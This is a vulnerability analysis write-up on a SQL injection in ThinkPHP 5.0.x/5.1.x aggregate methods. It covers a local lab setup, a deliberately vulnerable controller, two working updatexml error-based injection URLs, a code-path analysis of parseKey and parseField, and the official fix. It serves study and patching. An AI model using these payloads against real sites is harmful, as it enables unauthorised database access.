# ThinkPHP5 SQL Injection

Author: H3rmesk1t

Data: 2021.08.14

# Vulnerability Summary
- This vulnerability exists in all `Mysql` aggregation function related methods. Since the program does not filter the data well, it directly splices the data into SQL statements, which ultimately leads to the occurrence of SQL injection vulnerability.
- Vulnerability impact version: 5.0.0<=ThinkPHP<=5.0.21, 5.1.3<=ThinkPHP5<=5.1.25

# Initial configuration
Get the test environment code

```bash
composer create-project --prefer-dist topthink/think=5.1 tpH3rmesk1t
```
![Insert the picture description here](https://img-blog.csdnimg.cn/ad95b5b9781f4b9fabccb2dbae673760.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

Set the require field of the composer.json file to the following

````bas
"require": {
    "php": ">=5.6.0",
    "topthink/framework": "5.1.7"
}
```

Then execute `composer update`

![Insert the picture description here](https://img-blog.csdnimg.cn/344ef95318c342f1914da5e9a4f90185.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

- In the downloaded source code, the content of `application/index/controller/Index.php` needs to be modified

```php
<?php
namespace app\index\controller;

class Index
{
    public function index()
    {
        $options = request()->get('options');
        $result = db('users')->max($options);
        var_dump($result);
        return '<style type="text/css">*{ padding: 0; margin: 0; } div{ padding: 4px 48px;} a{color:#2E5CD5;cursor: pointer;text-decoration: none} a:hover{text-decoration:underline; } body{ background: #fff; font-family: "Century Gothic","Microsoft yahei"; color: #333;font-size:18px;} h1{ font-size: 100px; font-weight: normal; margin-bottom: 12px; } p{ line-height: 1.6em; font-size: 42px }</style><div style="padding: 24px 48px;"<h1>:) </h1><pThinkPHP V5.1<br/><span style="font-size:30px">12 years of original intention remains unchanged (2006-2018) - Your trustworthy PHP framework</span></p></div><script type="text/javascript" src="https://tajs.qq.com/stats?sId=64890268" charset="UTF-8"></script><script type="text/javascript" src="https://e.topthink.com/Public/static/client.js"></script><think id="eab4b9f840753f8e7"></think>';
    }
}
```

Configure database-related information in the `config/database.php` file, and enable app_debug and app_trace in `config/app.php`. Create database information as follows

```php
create database thinkphp;
use thinkphp;
create table users(
	id int primary key auto_increment,
	username varchar(50) not null,
);
insert into users(id,username) values(1,'H3rmesk1t');
```
# Vulnerability Exploit

Payload

````bas
5.0.0~5.0.21, 5.1.3~5.1.10
http://127.0.0.1/cms/public/index.php?options=id)%2bupdatexml(1,concat(0x7,user(),0x7e),1) from users%23
5.1.11～5.1.25
http://127.0.0.1/cms/public/index.php?options=id`)%2bupdatexml(1,concat(0x7,user(),0x7e),1) from users%23
```
![Insert the picture description here](https://img-blog.csdnimg.cn/eb88c5392a2745b98f180ba3d5d012ad.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
# Vulnerability Analysis

The user-controllable data has not been filtered. The `max` method of the `Query` class is passed in for aggregate query statement construction, and then the `aggregate` method of this class is called. This vulnerability problem occurs in the underlying code of the function, so all the aggregate methods that call this method have SQL injection problems. We see that the `aggregate` method calls the `aggregate` method of the `Mysql` class. In this method, we can clearly see that the program splices the user-controllable variable `$field` with the SQL statement after processing the `parseKey` method.

The other processes are similar to the previous analysis. For details, please take a look at the `parseKey` method.

![Insert the picture description here](https://img-blog.csdnimg.cn/e20d6659c1eb403c80289a864e0ff5ff.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

The `parseKey` method mainly processes field and table names. Here we just add backticks to both ends of our data. After the `parseKey` method is processed, the program returns to the `$this->value()` method in the figure above. This method will call the `select` method of the `Builder` class to construct SQL statements. This method should be said to be very common when analyzing ThinkPHP vulnerabilities. It is nothing more than using the `str_replace` method to replace the variables into the SQL statement template. Here we focus on the `parseField` method, because user-controllable data is stored in the `$options['field']` variable and passed into the method.

![Insert the picture description here](https://img-blog.csdnimg.cn/35601821d47a44b98695c4cc5a8b4ac0.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

Entering the `parseField` method, we found that the user-controllable data is only processed by the `parseKey` method, and does not affect the data. Then it is spliced ​​with commas and finally replaced directly into the SQL statement template, resulting in the occurrence of SQL injection vulnerability.

![Insert the image description here](https://img-blog.csdnimg.cn/a181aa72590b4399818ada6fa8b897df.png?x-oss-process=image/watermark,
type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
# Vulnerability Fix

The official fix is: when matching characters other than letters, dots, and asterisks, an exception is thrown.

![Insert the picture description here](https://img-blog.csdnimg.cn/835bd07f790849cda255290687ec65b1.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
# Attack summary

Refer to Master Mochazz's audit process

![Insert the picture description here](https://img-blog.csdnimg.cn/f4c78426789146f79568f3a6bfb5d9d3.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)